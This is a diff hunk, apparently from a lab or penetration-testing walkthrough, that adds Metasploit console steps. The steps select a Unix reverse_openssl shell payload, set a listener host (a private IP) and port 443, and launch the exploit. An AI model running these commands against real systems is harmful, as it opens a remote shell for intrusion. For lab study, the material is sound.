@@ -262,6 +262,14 @@ msf5> `set LPORT 443`
 
 msf5> `show options`
 
+msf5> `show payloads`
+
+msf5> `set payload payload/cmd/unix/reverse_openssl`
+
+msf5> `set LHOST  172.20.1.237`
+
+msf5> `set LPORT  443`
+
 msf5> `exploit`
 
 
